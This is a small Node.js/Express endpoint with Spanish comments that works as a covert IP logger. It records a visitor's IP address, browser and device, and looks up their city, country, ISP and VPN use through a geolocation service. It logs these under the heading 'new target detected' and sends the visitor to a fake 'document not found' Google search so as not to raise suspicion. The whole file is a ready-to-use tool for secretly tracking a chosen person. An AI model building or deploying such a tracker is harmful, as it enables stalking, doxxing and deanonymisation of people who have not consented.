const express = require('express');
const axios = require('axios');
const app = express();

app.get('/api/track', async (req, res) => {
    try {
        // 1. Obtener la IP real (manejando proxies de Vercel/Netlify)
        const ip = req.headers['x-forwarded-for']?.split(',')[0] || req.socket.remoteAddress;

        // 2. Obtener el User Agent (Dispositivo/Browser)
        const userAgent = req.headers['user-agent'];

        // 3. Obtener Localización (Geocoding por IP)
        const geoResponse = await axios.get(`http://ip-api.com/json/${ip}?fields=status,country,city,isp,mobile,proxy`);
        const geo = geoResponse.data;

        // 4. Loggear en consola para tu reporte
        console.log("--- NUEVO TARGET DETECTADO ---");
        console.log(`IP: ${ip}`);
        console.log(`Dispositivo: ${userAgent}`);
        console.log(`Ubicación: ${geo.city}, ${geo.country}`);
        console.log(`ISP: ${geo.isp}`);
        console.log(`Es Mobile: ${geo.mobile ? 'Sí' : 'No'}`);
        console.log(`Usa Proxy/VPN: ${geo.proxy ? 'Sí' : 'No'}`);

        // 5. Redirección final (Para no levantar sospechas)
        // Puedes redirigirlo a Google o a una imagen de "Archivo no encontrado"
        res.redirect('https://www.google.com/search?q=documento+no+encontrado+error+404');

    } catch (error) {
        console.error("Error capturando datos:", error);
        res.redirect('https://www.google.com');
    }
});

module.exports = app;